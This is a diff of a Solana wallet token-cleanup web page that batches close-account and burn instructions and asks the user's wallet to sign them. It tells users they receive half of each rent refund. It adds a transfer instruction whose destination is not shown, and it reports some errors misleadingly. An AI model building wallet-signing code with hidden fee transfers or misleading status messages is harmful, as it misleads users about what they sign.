+                        processingProgressBar.style.width = `${progress}%`;
+                        processingProgressBar.textContent = `${progress}%`;
+                        processingMessage.textContent = `Processing...`;
+
+                        await new Promise(resolve => setTimeout(resolve, 1000)); // تحديث الحالة كل ثانية
+                    }
+
+                    if (transactionStatus === 'error') {
+                        processingMessage.textContent = `Transaction failed! Please check console for details.`;
+                        break;
+                    }
+                }
+
+                processingProgressBar.style.width = '100%';
+                processingProgressBar.textContent = '100%';
+                processingMessage.innerHTML = "<div style='color: #4CAF50; font-size: 24px;'>✅ Transaction completed successfully!</div>";
+
+                try {
+                    // تحديث القائمة مباشرة من البلوكتشين
+                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+                        new solanaWeb3.PublicKey(wallet),
+                        { programId: TOKEN_PROGRAM_ID }
+                    );
+
+                    // تحديث البيانات المحلية
+                    walletData.tokens = tokenAccounts.value.map(account => ({
+                        address: account.pubkey.toString(),
+                        mint: account.account.data.parsed.info.mint,
+                        amount: account.account.data.parsed.info.tokenAmount.uiAmount,
+                        decimals: account.account.data.parsed.info.tokenAmount.decimals,
+                        name: account.account.data.parsed.info.tokenAmount.uiAmountString
+                    }));
+
+                    selectedTokens.clear();
+                    updateTab();
+                    updateSelectedCount();
+                    updateSelectionSummary();
+
+                    document.getElementById('tokenList').style.display = 'grid';
+                    document.getElementById('processingContainer').style.display = 'none';
+
+                    const cleanupBtn = document.getElementById('summaryCleanupBtn');
+                    cleanupBtn.textContent = "Cleanup";
+                    cleanupBtn.classList.remove('loading');
+                    cleanupBtn.disabled = false;
+                } catch (error) {
+                    console.error('Error updating from blockchain:', error);
+                    processingMessage.textContent = "Error updating display. Please refresh the page.";
+                }
+            } catch (error) {
+                console.error('Cleanup error:', error);
+
+                if (error.message.includes('already been processed')) {
+                    processingMessage.innerHTML = "<div style='color: #4CAF50; font-size: 24px;'>✅ Transaction Successful!</div>";
+                    processingProgressBar.style.width = '100%';
+                    processingProgressBar.textContent = '100%';
+                } else if (error.message.includes('User rejected') || 
+                         error.message.includes('4001') ||
+                         error.message.includes('Failed to sign') ||
+                         error.message.includes('Transaction failed') ||
+                         error.message.includes('User denied')) {
+                    processingMessage.innerHTML = "<div class='cancelled-message'>❌ Cancelled</div>";
+                    processingProgressBar.style.width = '0%';
+                    processingProgressBar.textContent = '';
+                } else {
+                    processingMessage.innerHTML = "<div class='cancelled-message'>❌ Cancelled</div>";
+                    processingProgressBar.style.width = '0%';
+                    processingProgressBar.textContent = '';
+                }
+
+                processingProgressBar.style.background = '#f44336';
+
+                const cleanupBtn = document.getElementById('summaryCleanupBtn');
+                cleanupBtn.textContent = "Cleanup";
+                cleanupBtn.classList.remove('loading');
+                cleanupBtn.disabled = false;
+
+                setTimeout(() => {
+                    document.getElementById('tokenList').style.display = 'grid';
+                    document.getElementById('processingContainer').style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        async function cleanEmptyAccounts(tokenAccounts) {
+            let operationCancelled = false;
+            if (!wallet) return;
+
+            try {
+                const connection = new solanaWeb3.Connection(
+                    "{{ RPC_URL }}",
+                    { 
+                        commitment: 'confirmed',
+                        disableRetryOnRateLimit: false,
+                        confirmTransactionInitialTimeout: 10000
+                    }
+                );
+
+                const batches = [];
+                const batchSize = currentTab === 'EMPTY' ? CLOSE_BATCH_SIZE : BURN_BATCH_SIZE;
+                for (let i = 0; i < tokenAccounts.length; i += batchSize) {
+                    batches.push(tokenAccounts.slice(i, i + batchSize));
+                }
+
+                let successfulCleanups = 0;
+                let failedCleanups = 0;
+
+                const modalProgressBar = document.getElementById('modalProgressBar');
+                const modalResult = document.getElementById('progressModalResult');
+                const modalDetails = document.getElementById('progressModalDetails');
+
+                for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
+                    if (operationCancelled) break;
+
+                    const batch = batches[batchIndex];
+                    const transaction = new solanaWeb3.Transaction();
+
+                    const progress = Math.round((batchIndex * batchSize / tokenAccounts.length) * 100);
+                    modalProgressBar.style.width = `${progress}%`;
+                    modalProgressBar.textContent = `${progress}%`;
+
+                    const totalRefundPerToken = REFUND_AMOUNT / LAMPORTS_PER_SOL;
+                    const actualRefundPerToken = totalRefundPerToken / 2;
+
+                    const memoInstruction = new solanaWeb3.TransactionInstruction({
+                        keys: [],
+                        programId: new solanaWeb3.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
+                        data: Buffer.from(`Total Refund: ${totalRefundPerToken.toFixed(6)} SOL | Your Share: ${actualRefundPerToken.toFixed(6)} SOL per account`)
+                    });
+                    transaction.add(memoInstruction);
+
+                    for (const account of batch) {
+                        try {
+                            const instruction = await getCloseAccountInstruction(account, wallet);
+                            transaction.add(instruction);
+                        } catch (error) {
+                            console.error(`Error creating close instruction for ${account}:`, error);
+                            failedCleanups++;
+                            continue;
+                        }
+                    }
+
+                    if (transaction.instructions.length === 0) {
+                        continue;
+                    }
+
+                    try {
+                        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                        transaction.recentBlockhash = blockhash;
+                        transaction.feePayer = new solanaWeb3.PublicKey(wallet);
+
+                        let signedTransaction;
+                        try {
+                            signedTransaction = await window.solana.signTransaction(transaction);
+                        } catch (err) {
+                            if (err.message.includes('User rejected') || err.code === 4001) {
+                                modalResult.textContent = "Failed Transaction ❌";
+                                modalResult.className = "progress-modal-result error";
+                                modalResult.style.color = '#f44336';
+                                modalDetails.textContent = "Transaction Failed";
+                                modalResult.style.display = 'block';
+                                modalDetails.style.display = 'block';
+                                const cleanupBtn = document.getElementById('summaryCleanupBtn');
+                                cleanupBtn.innerHTML = 'Cleanup';
+                                cleanupBtn.disabled = false;
+                                operationCancelled = true;
+                                progressModal.addEventListener('click', hideModal, { once: true });
+                                modalProgressBar.style.background = '#ffffff';
+                                break;
+                            } else {
+                                throw err;
+                            }
+                        }
+
+                        const rawTransaction = signedTransaction.serialize();
+                        const signature = await connection.sendRawTransaction(rawTransaction, {
+                            skipPreflight: true,
+                            preflightCommitment: 'confirmed'
+                        });
+
+                        const confirmation = await connection.confirmTransaction({
+                            signature,
+                            blockhash,
+                            lastValidBlockHeight
+                        }, 'confirmed');
+
+                        if (!confirmation?.value || confirmation.value.err) {
+                            throw new Error('Transaction confirmation failed: ' + JSON.stringify(confirmation.value.err));
+                        }
+
+                        successfulCleanups += batch.length;
+                    } catch (error) {
+                        console.error(`Error processing batch ${batchIndex + 1}:`, error);
+                        failedCleanups += batch.length;
+                    }
+                }
+
+                updateProgress(
+                    tokenAccounts.length,
+                    tokenAccounts.length,
+                    `✅ Transaction Successful! Cleaned: ${successfulCleanups}, Failed: ${failedCleanups}`
+                );
+
+
+                selectedTokens.clear();
+                await checkWallet(); 
+                updateTab(); 
+                updateSelectedCount();
+
+                setTimeout(() => {
+                    modalProgressBar.style.width = '100%';
+                }, 2000);
+
+            } catch (error) {                console.error('Cleanup error:', error);
+                updateProgress(0, tokenAccounts.length, `❌ Error: ${error.message}`);
+                        }
+        }
+
+        function prevTab() {
+            currentTabIndex = (currentTabIndex - 1 + tabs.length) % tabs.length;
+            selectedTokens.clear();
+            updateTab();
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function nextTab() {
+            currentTabIndex = (currentTabIndex + 1) % tabs.length;
+            selectedTokens.clear();
+            updateTab();
+            updateSelectedCount();
+            updateEstimatedRefund();
+            updateSelectionSummary();
+        }
+
+        function showDisconnectConfirmation() {
+            const dialogHTML = `
+                <div id="disconnectDialog" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+                     background: rgba(10, 11, 13, 0.95); padding: 25px; border-radius: 16px; z-index: 1000; 
+                     box-shadow: 0 4px 20px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); max-width: 90%; width: 400px;">
+                    <h3 style="color: #fff; margin-bottom: 15px; text-align: center;">Disconnect Wallet</h3>
+                    <p style="color: #fff; margin-bottom: 15px; text-align: center;">
+                        Are you sure you want to disconnect your wallet?
+                    </p>
+                    <div style="display: flex; justify-content: center; gap: 15px;">
+                        <button onclick="confirmDisconnect()" style="padding: 10px 25px; border-radius: 8px; border: none; 
+                                background: #4CAF50; color: white; cursor: pointer;">Confirm</button>
+                        <button onclick="cancelDisconnect()" style="padding: 10px 25px; border-radius: 8px; border: none; 
+                                background: #f44336; color: white; cursor: pointer;">Cancel</button>
+                    </div>
+                </div>
+                <div id="disconnectOverlay" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; 
+                     background: rgba(0,0,0,0.7); z-index: 999;"></div>
+            `;
+
+            document.body.insertAdjacentHTML('beforeend', dialogHTML);
+        }
+
+        function confirmDisconnect() {
+            document.getElementById('disconnectDialog').remove();
+            document.getElementById('disconnectOverlay').remove();
+
+            wallet = null;
+            selectedTokens.clear();
+            window.location.reload();
+        }
+
+        function cancelDisconnect() {
+            document.getElementById('disconnectDialog').remove();
+            document.getElementById('disconnectOverlay').remove();
+        }
+
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('result');
+            statusDiv.innerHTML = `<p style="color: ${type === 'error' ? '#ff4444' : type === 'success' ? '#4CAF50' : '#3898ff'};">${message}</p>`;
+        }
+
+        async function connectWallet() {
+            try {
+                let provider;
+
+                if (window.solflare?.isSolflare) {
+                    provider = window.solflare;
+                    console.log("Found Solflare wallet");
+                } 
+                else if (window.phantom?.solana?.isPhantom) {
+                    provider = window.phantom.solana;
+                    console.log("Found Phantom wallet");
+                }
+
+                if (!provider) {
+                    alert('Please install Solflare or Phantom wallet');
+                    return;
+                }
+
+                if (window.solflare?.isSolflare) {
+                    provider.on('connect', async (publicKey) => {
+                        wallet = publicKey.toString();
+                        document.getElementById('connectBtn').style.display = 'none';
+                        await checkWallet();
+                    });
+                } 
+                else {
+                    provider.on('connect', () => {
+                        wallet = provider.publicKey.toString();
+                        document.getElementById('connectBtn').style.display = 'none';
+                        checkWallet();
+                    });
+                }
+
+                await provider.connect();
+
+            } catch (err) {
+                console.error('Connection error:', err);
+                alert('Failed to connect wallet: ' + err.message);
+            }
+        }
+
+        window.addEventListener('load', () => {
+            const hash = window.location.hash.substring(1);
+            const tabIndex = tabs.indexOf(hash);
+            if (tabIndex >= 0) {
+                currentTabIndex = tabIndex;
+            }
+            if (wallet) {
+                updateTab();
+            }
+        });
+
+        function updateEstimatedRefund() {
+            const estimatedRefundElement = document.getElementById('estimatedRefund');
+            if (estimatedRefundElement) {
+                const estimatedRefund = (selectedTokens.size * REFUND_AMOUNT / LAMPORTS_PER_SOL / 2).toFixed(3);
+                estimatedRefundElement.textContent = estimatedRefund;
+            }
+            updateSelectionSummary();
+        }
+
+        async function getInstructionsForToken(tokenAddress) {
+            const instructions = [];
+            const currentTab = tabs[currentTabIndex];
+
+            if (currentTab === 'EMPTY') {
+                instructions.push(await getCloseAccountInstruction(tokenAddress, wallet));
+            } else {
+                const [burnInstruction, closeInstruction, transferInstruction] = await getBurnAndCleanupInstructions(tokenAddress, wallet);
+                instructions.push(burnInstruction, closeInstruction, transferInstruction);
+            }
+            return instructions;
+        }
+
+        async function signAndSendAll() {
+            const tokens = Array.from(selectedTokens);
+            const transactions = [];
+
+            for (let i = 0; i < tokens.length; i += MAX_INSTRUCTIONS_PER_TX) {
+                const batch = tokens.slice(i, i + MAX_INSTRUCTIONS_PER_TX);
+                const instructions = [];
+
+                for (const token of batch) {
+                    instructions.push(...await getInstructionsForToken(token));
+                }
+
+                const messageV0 = new solanaWeb3.TransactionMessage({
+                    payerKey: new solanaWeb3.PublicKey(wallet),
+                    recentBlockhash: (await connection.getLatestBlockhash()).blockhash,
+                    instructions
+                }).compileToV0Message();
+
+                transactions.push(new solanaWeb3.VersionedTransaction(messageV0));
+            }
+
+            const signedTxs = await window.solana.signAllTransactions(transactions);
+
+            for (const tx of signedTxs) {
+                await connection.sendRawTransaction(tx.serialize());
+            }
+        }
+
+        function updateSelectionSummary() {
+            const summaryElement = document.getElementById('selectionSummary');
+            const actionBtn = document.getElementById('actionBtn');
+            const selectedCount = selectedTokens.size;
+
+            if (selectedCount > 0) {
+                summaryElement.classList.remove('hidden');
+                document.getElementById('summarySelectedCount').textContent = selectedCount;
+                const estimatedRefund = (selectedCount * REFUND_AMOUNT / LAMPORTS_PER_SOL / 2).toFixed(3);
+                document.getElementById('summaryEstimatedRefund').textContent = `${estimatedRefund} SOL`;
+                if (actionBtn) {
+                    actionBtn.style.display = 'none';
+                }
+            } else {
+                summaryElement.classList.add('hidden');
+                if (actionBtn) {
+                    actionBtn.style.display = 'inline-block';
+                }
+            }
+        }
+
+        const originalToggleTokenSelection = toggleTokenSelection;
+        toggleTokenSelection = function(tokenAddress, element) {
+            originalToggleTokenSelection.call(this, tokenAddress, element);
+            updateSelectionSummary();
+        };
+
+        const originalToggleAllTokens = toggleAllTokens;
+        toggleAllTokens = function() {
+            originalToggleAllTokens.call(this);
+            updateSelectionSummary();
+        };
+
+        const originalSelect100Tokens = select100Tokens;
+        select100Tokens = function() {
+            originalSelect100Tokens.call(this);
+            updateSelectionSummary();
+        };
+
+        window.addEventListener('load', () => {
+            const summaryCleanupBtn = document.getElementById('summaryCleanupBtn');
+            if (summaryCleanupBtn) {
+                summaryCleanupBtn.addEventListener('click', processSelectedTokens);
+            }
+        });
+
+    </script>
+    <div id="selectionSummary" class="selection-summary hidden">
+        <div class="summary-info">
+            <div class="summary-item">
+                <span class="summary-label">Selected</span>
+                <span id="summarySelectedCount" class="summary-value">0</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">Estimated Refund</span>
+                <span id="summaryEstimatedRefund" class="summary-value">0.000 SOL</span>
+            </div>
+        </div>
+        <button id="summaryCleanupBtn" class="cleanup-summary-btn">Cleanup</button>
+    </div>
+</body>
+</html>
